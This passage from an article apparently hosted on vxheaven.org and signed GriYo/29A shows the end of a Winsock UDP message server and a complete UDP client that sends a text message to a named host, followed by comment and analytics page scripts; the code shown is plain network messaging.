+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span> <span style="color: black;">&#40;</span> listen_socket <span style="color: #339933;">=</span> socket<span style="color: black;">&#40;</span> AF_INET<span style="color: #339933;">,</span> SOCK_DGRAM<span style="color: #339933;">,</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> INVALID_SOCKET<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span> <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WSACleanup<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #339933;">-</span><span style="color: #0000dd;">1</span> <span style="color: #339933;">;</span> <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span> bind<span style="color: black;">&#40;</span>&nbsp; &nbsp; &nbsp; listen_socket<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span> <span style="color: #993333;">struct</span> sockaddr<span style="color: #339933;">*</span><span style="color: black;">&#41;</span> <span style="color: #339933;">&amp;</span>amp<span style="color: #339933;">;</span>local<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span> local<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> SOCKET_ERROR<span style="color: black;">&#41;</span> <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span> <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WSACleanup<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #339933;">-</span><span style="color: #0000dd;">1</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; fromlen <span style="color: #339933;">=</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span> from<span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a> <span style="color: black;">&#40;</span> <span style="color: #ff0000;">&quot;Waiting for incomming messages...<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">do</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; retval <span style="color: #339933;">=</span> recvfrom<span style="color: black;">&#40;</span>&nbsp; &nbsp; &nbsp; listen_socket<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Buffer<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">sizeof</span> <span style="color: black;">&#40;</span> Buffer<span style="color: black;">&#41;</span><span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000dd;">0</span><span style="color: #339933;">,</span> <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span> <span style="color: #993333;">struct</span> sockaddr <span style="color: #339933;">*</span><span style="color: black;">&#41;</span> <span style="color: #339933;">&amp;</span>amp<span style="color: #339933;">;</span>from<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">&amp;</span>amp<span style="color: #339933;">;</span>fromlen<span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span> retval <span style="color: #339933;">!=</span> SOCKET_ERROR<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Buffer<span style="color: black;">&#91;</span> retval<span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> NULL <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; MessageBox<span style="color: black;">&#40;</span> &nbsp; &nbsp; NULL<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Buffer<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; inet_ntoa<span style="color: black;">&#40;</span> from.<span style="color: #202020;">sin_addr</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; MB_ICONINFORMATION <span style="color: #339933;">|</span> MB_OK<span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span> <span style="color: #b1b100;">while</span> <span style="color: black;">&#40;</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; closesocket<span style="color: black;">&#40;</span> listen_socket<span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; WSACleanup<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span> <span style="color: #339933;">;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+&nbsp;</div>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">//</span><br/>
+<span style="color: black; font-style: italic;">// CLIENT.CPP</span><br/>
+<span style="color: black; font-style: italic;">//</span><br/>
+<br/>
+<span style="color: #339933;">#include &quot;stdafx.h&quot;</span><br/>
+<span style="color: #339933;">#include &amp;lt;windows.h&gt;</span><br/>
+<span style="color: #339933;">#include &amp;lt;winsock2.h&gt;</span><br/>
+<br/>
+<span style="color: #339933;">#define LISTEN_PORT 16384</span><br/>
+<br/>
+<span style="color: #993333;">int</span> main<span style="color: black;">&#40;</span><span style="color: #993333;">int</span> argc<span style="color: #339933;">,</span> <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>argv<span style="color: black;">&#91;</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">struct</span> sockaddr_in&nbsp; &nbsp; &nbsp; server <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">struct</span> hostent&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">*</span>hp <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">int</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; addr <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; WSADATA &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; wsaData <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; SOCKET&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; conn_socket <span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span> argc <span style="color: #339933;">!=</span> <span style="color: #0000dd;">3</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a> <span style="color: black;">&#40;</span> <span style="color: #ff0000;">&quot;Usage:<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\n</span>%s &amp;lt;target&gt; &amp;lt;<span style="color: #000099; font-weight: bold;">\&quot;</span>message<span style="color: #000099; font-weight: bold;">\&quot;</span>&gt;<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span> argv<span style="color: black;">&#91;</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #339933;">-</span><span style="color: #0000dd;">1</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span> WSAStartup <span style="color: black;">&#40;</span> <span style="color: #208080;">0x0202</span><span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span>amp<span style="color: #339933;">;</span>wsaData<span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> SOCKET_ERROR<span style="color: black;">&#41;</span> <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span> &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a> <span style="color: black;">&#40;</span> <span style="color: #ff0000;">&quot;Error: WSAStartup()<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WSACleanup <span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #339933;">-</span><span style="color: #0000dd;">1</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/isalpha.html"><span style="color: #000066;">isalpha</span></a> <span style="color: black;">&#40;</span> <span style="color: #339933;">*</span>argv<span style="color: black;">&#91;</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> hp <span style="color: #339933;">=</span> gethostbyname <span style="color: black;">&#40;</span> argv<span style="color: black;">&#91;</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span> &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span> <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; addr <span style="color: #339933;">=</span> inet_addr<span style="color: black;">&#40;</span> argv<span style="color: black;">&#91;</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; hp <span style="color: #339933;">=</span> gethostbyaddr<span style="color: black;">&#40;</span> <span style="color: black;">&#40;</span> <span style="color: #993333;">char</span> <span style="color: #339933;">*</span><span style="color: black;">&#41;</span> <span style="color: #339933;">&amp;</span>amp<span style="color: #339933;">;</span>addr<span style="color: #339933;">,</span> <span style="color: #0000dd;">4</span><span style="color: #339933;">,</span> AF_INET<span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span> <br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span> hp <span style="color: #339933;">==</span> NULL<span style="color: black;">&#41;</span> <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span> <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a> <span style="color: black;">&#40;</span> <span style="color: #ff0000;">&quot;Error: Target not found<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WSACleanup <span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">;</span> <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #339933;">-</span><span style="color: #0000dd;">1</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span> <br/>
+&nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/memset.html"><span style="color: #000066;">memset</span></a> <span style="color: black;">&#40;</span> <span style="color: #339933;">&amp;</span>amp<span style="color: #339933;">;</span>server<span style="color: #339933;">,</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span> <span style="color: black;">&#40;</span> server<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/memcpy.html"><span style="color: #000066;">memcpy</span></a> <span style="color: black;">&#40;</span> <span style="color: #339933;">&amp;</span>amp<span style="color: #339933;">;</span><span style="color: black;">&#40;</span> server.<span style="color: #202020;">sin_addr</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span> hp<span style="color: #339933;">-&gt;</span>h_addr<span style="color: #339933;">,</span> hp<span style="color: #339933;">-&gt;</span>h_length<span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; server.<span style="color: #202020;">sin_family</span> <span style="color: #339933;">=</span> hp<span style="color: #339933;">-&gt;</span>h_addrtype <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; server.<span style="color: #202020;">sin_port</span> <span style="color: #339933;">=</span> htons <span style="color: black;">&#40;</span> LISTEN_PORT<span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; conn_socket <span style="color: #339933;">=</span> socket <span style="color: black;">&#40;</span> AF_INET<span style="color: #339933;">,</span> SOCK_DGRAM<span style="color: #339933;">,</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span> conn_socket <span style="color: #339933;">&amp;</span>lt<span style="color: #339933;">;</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a> <span style="color: black;">&#40;</span> <span style="color: #ff0000;">&quot;Error: socket()<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WSACleanup <span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #339933;">-</span><span style="color: #0000dd;">1</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Yes, yes, i know UDP is connectionless... but there is a reason for this, belive me</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span> connect<span style="color: black;">&#40;</span> conn_socket<span style="color: #339933;">,</span> <span style="color: black;">&#40;</span> <span style="color: #993333;">struct</span> sockaddr<span style="color: #339933;">*</span><span style="color: black;">&#41;</span> <span style="color: #339933;">&amp;</span>amp<span style="color: #339933;">;</span>server<span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span> <span style="color: black;">&#40;</span> server<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> SOCKET_ERROR<span style="color: black;">&#41;</span> <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a> <span style="color: black;">&#40;</span> <span style="color: #ff0000;">&quot;Error: connect()<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; closesocket<span style="color: black;">&#40;</span> conn_socket<span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WSACleanup <span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #339933;">-</span><span style="color: #0000dd;">1</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span> send<span style="color: black;">&#40;</span> conn_socket<span style="color: #339933;">,</span> argv<span style="color: black;">&#91;</span> <span style="color: #0000dd;">2</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/strlen.html"><span style="color: #000066;">strlen</span></a> <span style="color: black;">&#40;</span> argv<span style="color: black;">&#91;</span> <span style="color: #0000dd;">2</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> SOCKET_ERROR<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a> <span style="color: black;">&#40;</span> <span style="color: #ff0000;">&quot;Error: send()<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; closesocket<span style="color: black;">&#40;</span> conn_socket<span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WSACleanup <span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #339933;">-</span><span style="color: #0000dd;">1</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span> <span style="color: #339933;">;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+&nbsp;</div>
+<p>Good, and this is everything per today. I hope you have enjoyed.</p>
+<pre>
+			GriYo/29A
+			I'm not in the business... I am the business
+</pre>
+[<a style="" href="/lib/?lang=EN&amp;index=WI#vgy03">Back to index</a>] [<a href="/lib/vgy03.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
+<script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vgy03">de</a><a href="/lib/index.php?lang=en&amp;id=vgy03">en</a><a href="/lib/index.php?lang=es&amp;id=vgy03">es</a><a href="/lib/index.php?lang=it&amp;id=vgy03">it</a><a href="/lib/index.php?lang=fr&amp;id=vgy03">fr</a><a href="/lib/index.php?lang=pl&amp;id=vgy03">pl</a><a href="/lib/index.php?lang=ru&amp;id=vgy03">ru</a><a href="/lib/index.php?lang=ua&amp;id=vgy03">ua</a></div>
+</body>
+</html>
